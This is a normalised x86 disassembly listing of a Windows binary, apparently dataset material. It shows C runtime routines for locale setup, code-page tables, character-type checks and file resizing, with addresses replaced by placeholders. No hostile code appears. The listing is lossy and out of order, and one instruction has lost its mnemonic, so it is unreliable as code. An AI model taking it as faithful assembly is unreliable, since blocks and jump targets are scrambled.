push [ esi + 0x2c ]
call sub_40b955
push [ esi + 0x30 ]
call sub_40b955
push [ esi + 0x34 ]
call sub_40b955
push [ esi + 0x1c ]
call sub_40b955
push [ esi + 0x38 ]
call sub_40b955
push [ esi + 0x3c ]
call sub_40b955
add esp 0x40
push [ esi + 0x40 ]
call sub_40b955
push [ esi + 0x44 ]
call sub_40b955
push [ esi + 0x48 ]
call sub_40b955
push [ esi + 0x4c ]
call sub_40b955
push [ esi + 0x50 ]
call sub_40b955
push [ esi + 0x54 ]
call sub_40b955
push [ esi + 0x58 ]
call sub_40b955
push [ esi + 0x5c ]
call sub_40b955
push [ esi + 0x60 ]
call sub_40b955
push [ esi + 0x64 ]
call sub_40b955
push [ esi + 0x68 ]
call sub_40b955
push [ esi + 0x6c ]
call sub_40b955
push [ esi + 0x70 ]
call sub_40b955
push [ esi + 0x74 ]
call sub_40b955
push [ esi + 0x78 ]
call sub_40b955
push [ esi + 0x7c ]
call sub_40b955
add esp 0x40
push [ esi + 0x80 ]
call sub_40b955
push [ esi + 0x84 ]
call sub_40b955
push [ esi + 0x88 ]
call sub_40b955
push [ esi + 0x8c ]
call sub_40b955
push [ esi + 0x90 ]
call sub_40b955
push [ esi + 0x94 ]
call sub_40b955
push [ esi + 0x98 ]
call sub_40b955
push [ esi + 0x9c ]
call sub_40b955
push [ esi + 0xa0 ]
call sub_40b955
push [ esi + 0xa4 ]
call sub_40b955
push [ esi + 0xa8 ]
call sub_40b955
push [ esi + 0xbc ]
call sub_40b955
push [ esi + 0xc0 ]
call sub_40b955
push [ esi + 0xc4 ]
call sub_40b955
push [ esi + 0xc8 ]
call sub_40b955
push [ esi + 0xcc ]
call sub_40b955
add esp 0x40
push [ esi + 0xd0 ]
call sub_40b955
push [ esi + 0xb8 ]
call sub_40b955
push [ esi + 0xd8 ]
call sub_40b955
push [ esi + 0xdc ]
call sub_40b955
push [ esi + 0xe0 ]
call sub_40b955
push [ esi + 0xe4 ]
call sub_40b955
push [ esi + 0xe8 ]
call sub_40b955
push [ esi + 0xec ]
call sub_40b955
push [ esi + 0xd4 ]
call sub_40b955
push [ esi + 0xf0 ]
call sub_40b955
push [ esi + 0xf4 ]
call sub_40b955
push [ esi + 0xf8 ]
call sub_40b955
push [ esi + 0xfc ]
call sub_40b955
push [ esi + 0x100 ]
call sub_40b955
push [ esi + 0x104 ]
call sub_40b955
push [ esi + 0x108 ]
call sub_40b955
add esp 0x40
push [ esi + 0x10c ]
call sub_40b955
push [ esi + 0x110 ]
call sub_40b955
push [ esi + 0x114 ]
call sub_40b955
push [ esi + 0x118 ]
call sub_40b955
push [ esi + 0x11c ]
call sub_40b955
push [ esi + 0x120 ]
call sub_40b955
push [ esi + 0x124 ]
call sub_40b955
push [ esi + 0x128 ]
call sub_40b955
push [ esi + 0x12c ]
call sub_40b955
push [ esi + 0x130 ]
call sub_40b955
push [ esi + 0x134 ]
call sub_40b955
push [ esi + 0x138 ]
call sub_40b955
push [ esi + 0x13c ]
call sub_40b955
push [ esi + 0x140 ]
call sub_40b955
push [ esi + 0x144 ]
call sub_40b955
push [ esi + 0x148 ]
call sub_40b955
add esp 0x40
push [ esi + 0x14c ]
call sub_40b955
push [ esi + 0x150 ]
call sub_40b955
push [ esi + 0x154 ]
call sub_40b955
push [ esi + 0x158 ]
call sub_40b955
push [ esi + 0x15c ]
call sub_40b955
push [ esi + 0x160 ]
call sub_40b955
add esp 0x18
sub_41a647
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x20 ] 0x0
push edi
mov ebx rwxdata
je r-xdata
mov edi ebx
push 0x164
push 0x1
call sub_40ef0a
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
mov [ esi + 0xd4 ] edi
xor eax eax
add eax 0xb4
push eax
call [ InterlockedDecrement@IAT ]
mov eax esi
mov ecx edi
call sub_419ad1
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ edi + 0xb4 ] 0x1
jmp r-xdata
push edi
call sub_41a2d0
push edi
call sub_40b955
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xd4 ]
cmp eax ebx
je r-xdata
sub_41a6c4
xor dl dl
cmp [ ecx ] dl
je r-xdata
retn
push ebx
push esi
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
inc ecx
mov eax ecx
sub al 0x30
mov [ ecx ] al
mov al [ ecx ]
cmp al 0x30
jl r-xdata
pop esi
pop ebx
mov bl [ eax + 0x1 ]
mov [ eax ] bl
inc eax
cmp [ eax ] dl
jne r-xdata
jmp r-xdata
cmp [ ecx ] dl
jne r-xdata
sub_41a6f4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rwxdata ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_40b955
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_40b955
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_40b955
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rwxdata ]
je r-xdata
push eax
call sub_40b955
pop ecx
push esi
call sub_40b955
pop ecx
sub_41a75d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x50
push 0x1
call sub_40ef0a
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x18 ] edi
jne r-xdata
mov esi [ esi + 0xbc ]
push 0x14
pop ecx
mov edi ebx
push 0x4
[ edi ] [ esi ]
call sub_40eec5
xor edi edi
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rwxdata
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov [ eax ] edi
cmp [ esi + 0x1c ] edi
je r-xdata
push ebx
call sub_40b955
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb4 ]
mov edi [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ rwxdata ]
mov [ ebx ] eax
mov eax [ rwxdata ]
mov [ ebx + 0x4 ] eax
mov eax [ rwxdata ]
mov [ ebx + 0x8 ] eax
mov eax [ rwxdata ]
mov [ ebx + 0x30 ] eax
mov eax [ rwxdata ]
mov [ ebp - 0x4 ] edi
mov [ ebx + 0x34 ] eax
push 0x4
call sub_40eec5
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
push eax
call edi
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x3e ]
push ebx
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_4121e3
mov edi eax
lea eax [ ebx + 0x4 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ ebx + 0x8 ]
push eax
push 0x10
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ ebx + 0x30 ]
push eax
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ ebx + 0x34 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_4121e3
add esp 0x14
or eax edi
je r-xdata
xor esi esi
inc esi
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb4 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push ebx
call sub_41a6f4
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ esi + 0xb0 ]
call sub_40b955
push [ esi + 0xbc ]
call sub_40b955
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push ebx
call sub_40b955
push [ ebp - 0x8 ]
call sub_40b955
pop ecx
pop ecx
mov eax esi
jmp r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ecx ] eax
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_41a94d
xor dl dl
cmp [ ecx ] dl
je r-xdata
retn
push ebx
push esi
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
inc ecx
mov eax ecx
sub al 0x30
mov [ ecx ] al
mov al [ ecx ]
cmp al 0x30
jl r-xdata
pop esi
pop ebx
mov bl [ eax + 0x1 ]
mov [ eax ] bl
inc eax
cmp [ eax ] dl
jne r-xdata
jmp r-xdata
cmp [ ecx ] dl
jne r-xdata
sub_41a97d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rwxdata ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_40b955
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_40b955
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_40b955
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_40b955
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_40b955
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_40b955
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_40b955
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_40b955
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_40b955
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_40b955
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_40b955
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rwxdata ]
je r-xdata
push eax
call sub_40b955
pop ecx
push esi
call sub_40b955
pop ecx
sub_41aa7b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x18 ] edi
jne r-xdata
push 0x50
push 0x1
call sub_40ef0a
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x4
call sub_40eec5
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rwxdata
jmp r-xdata
mov [ eax ] edi
cmp [ esi + 0x18 ] edi
je r-xdata
push ebx
call sub_40b955
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb8 ]
cmp eax edi
je r-xdata
push 0x14
pop ecx
mov esi rwxdata
mov edi ebx
[ edi ] [ esi ]
push 0x4
call sub_40eec5
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax edi
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x38 ]
lea eax [ ebx + 0xc ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_4121e3
mov edi eax
lea eax [ ebx + 0x10 ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ ebx + 0x14 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ ebx + 0x18 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ ebx + 0x1c ]
push eax
push 0x18
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ ebx + 0x20 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ ebx + 0x24 ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_4121e3
or edi eax
lea eax [ ebx + 0x28 ]
push eax
push 0x1a
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ ebx + 0x29 ]
push eax
push 0x19
push esi
push 0x0
lea eax [ ebp - 0x10 ]
push eax
call sub_4121e3
or edi eax
lea eax [ ebx + 0x2a ]
push eax
push 0x54
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_4121e3
or edi eax
lea eax [ ebx + 0x2b ]
push eax
push 0x55
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_4121e3
or edi eax
lea eax [ ebx + 0x2c ]
push eax
push 0x56
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ ebx + 0x2d ]
push eax
push 0x57
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_4121e3
or edi eax
lea eax [ ebx + 0x2e ]
push eax
push 0x52
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_4121e3
or edi eax
lea eax [ ebx + 0x2f ]
push eax
push 0x53
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_4121e3
or edi eax
lea eax [ ebx + 0x38 ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ ebx + 0x3c ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ ebx + 0x40 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ ebx + 0x44 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_4121e3
or edi eax
lea eax [ ebx + 0x48 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_4121e3
add esp 0x50
or edi eax
lea eax [ ebx + 0x4c ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_4121e3
add esp 0x14
or eax edi
je r-xdata
push ebx
call sub_40b955
push [ ebp - 0x8 ]
call sub_40b955
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb8 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
push ebx
call sub_41a97d
push ebx
call sub_40b955
push [ ebp - 0x8 ]
call sub_40b955
push [ ebp - 0x4 ]
call sub_40b955
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ esi + 0xbc ]
call sub_40b955
push [ esi + 0xb0 ]
call sub_40b955
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xbc ]
mov ecx [ ecx ]
mov [ ebx ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ ebx + 0x4 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x30 ]
mov [ ebx + 0x30 ] ecx
mov eax [ eax + 0xbc ]
mov eax [ eax + 0x34 ]
mov ecx [ ebp - 0x8 ]
mov [ ebx + 0x34 ] eax
xor eax eax
inc eax
xor edi edi
mov [ ecx ] eax
cmp [ ebp - 0x4 ] edi
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_41ae30
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x48 ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ esi + 0xc0 ] ebx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
mov [ esi + 0xac ] 0x1
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
push 0x4
call sub_40eec5
push 0x2
mov edi 0x180
push edi
mov [ ebp - 0x2c ] eax
call sub_40ef0a
push 0x1
push edi
mov [ ebp - 0x1c ] eax
call sub_40ef0a
push 0x1
push edi
mov [ ebp - 0x20 ] eax
call sub_40ef0a
push 0x1
push 0x101
mov [ ebp - 0x28 ] eax
call sub_40ef0a
add esp 0x24
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push eax
movzx eax [ esi + 0x30 ]
push 0x1004
push eax
lea eax [ ebp - 0x4c ]
push ebx
push eax
call sub_4121e3
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x2c ]
call sub_40b955
push [ ebp - 0x1c ]
call sub_40b955
push [ ebp - 0x20 ]
call sub_40b955
push [ ebp - 0x28 ]
call sub_40b955
xor ebx ebx
add esp 0x10
inc ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x24 ]
call sub_40b955
pop ecx
mov eax ebx
jmp r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] ebx
xor eax eax
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x5
ja r-xdata
movzx eax [ ebp - 0x18 ]
mov [ ebp - 0x30 ] eax
cmp eax 0x1
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push ebx
push [ esi + 0x4 ]
add eax 0x100
push eax
push 0x100
push [ ebp - 0x24 ]
mov [ ebp - 0x40 ] eax
push 0x1
push ebx
call sub_419a91
add esp 0x20
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
push ebx
push [ esi + 0x4 ]
mov edi 0xff
push edi
add ecx 0x81
push ecx
push edi
inc eax
push eax
push 0x100
push [ esi + 0x14 ]
push ebx
call sub_419964
add esp 0x24
test eax eax
je r-xdata
lea eax [ ebp - 0x11 ]
mov eax [ ebp - 0x28 ]
push ebx
push [ esi + 0x4 ]
add eax 0x81
push edi
push eax
mov eax [ ebp - 0x24 ]
push edi
inc eax
push eax
push 0x200
push [ esi + 0x14 ]
push ebx
call sub_419964
add esp 0x24
test eax eax
je r-xdata
movzx edi [ eax - 0x1 ]
movzx ecx cl
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
lea ecx [ eax + 0xfe ]
xor edx edx
cmp [ ebp - 0x30 ] 0x1
mov [ ecx ] dx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x3c ] ecx
lea ecx [ edi + 0x80 ]
mov [ edi + 0x7f ] bl
mov [ edx + 0x7f ] bl
mov [ ecx ] bl
mov [ ebp - 0x44 ] ecx
lea ecx [ edx + 0x80 ]
mov [ ebp - 0x38 ] ecx
mov [ ecx ] bl
jle r-xdata
cmp edi ecx
jle r-xdata
push 0xfe
lea ecx [ eax + 0x200 ]
push ecx
push eax
call sub_411080
push 0x7f
lea eax [ edi + 0x100 ]
push eax
push edi
call sub_411080
mov eax [ ebp - 0x28 ]
push 0x7f
lea ecx [ eax + 0x100 ]
push ecx
push eax
call sub_411080
mov eax [ esi + 0xc0 ]
add esp 0x24
cmp eax ebx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ edi + ecx ] 0x20
movzx ecx [ eax ]
inc edi
add eax 0x2
cmp [ eax - 0x1 ] bl
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] 0x1
mov [ esi + 0xc0 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0xc8 ] eax
mov eax [ ebp - 0x3c ]
mov [ esi + 0xc4 ] eax
mov eax [ ebp - 0x44 ]
mov [ esi + 0xcc ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0xd0 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0xac ] eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
cmp cl bl
je r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_40b955
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_40b955
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_40b955
push [ esi + 0xc0 ]
call sub_40b955
add esp 0x10
movzx ecx [ ecx - 0x1 ]
movzx edx dl
mov [ ebp - 0x20 ] ecx
cmp ecx edx
jg r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x2
mov [ ebp - 0x1c ] ecx
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea ecx [ eax + ecx * 2 + 0x100 ]
jmp r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
inc [ ebp - 0x20 ]
mov edx 0x8000
mov [ ecx ] dx
add ecx 0x2
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x1c ]
movzx ecx [ ecx ]
cmp [ ebp - 0x20 ] ecx
jle r-xdata
mov ecx [ ebp - 0x34 ]
sub_41b28e
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax 0xffff
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
movzx eax [ ebp - 0x4 ]
and [ ebp - 0x4 ] eax
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
sub_41b302
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_413695
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_40d1fa
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_413695
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_413695
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_413695
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_41b704
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_40d1fa
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_417abe
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_40d1fa
mov [ eax ] 0xd
call sub_40d20d
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_40d20d
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_40d1fa
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4108a8
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_41b704
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
jne r-xdata
sub_41b4b8
push 0x10
push r--data
call sub_40f510
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_40d20d
and [ eax ] 0x0
push 0x9
pop eax
jmp r-xdata
call sub_40d20d
and [ eax ] 0x0
call sub_40d1fa
push 0x9
pop esi
mov [ eax ] esi
cmp ebx [ rwxdata ]
jb r-xdata
call sub_40f555
retn
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rwxdata ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
push ebx
call sub_417b27
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
jl r-xdata
call sub_40d1fa
push 0x9
pop esi
mov [ eax ] esi
mov [ ebp - 0x1c ] esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_41b302
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
call sub_40d20d
and [ eax ] 0x0
call sub_40d1fa
push 0x16
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jae r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41b597
mov eax [ ebp - 0x1c ]
call sub_40e72d
mov eax esi
jmp r-xdata
sub_41b59f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cdq
push edx
push eax
push [ ebp + 0x8 ]
call sub_41b4b8
add esp 0xc
neg eax
sbb eax eax
pop ebp
retn
sub_41b5bb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_417abe
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
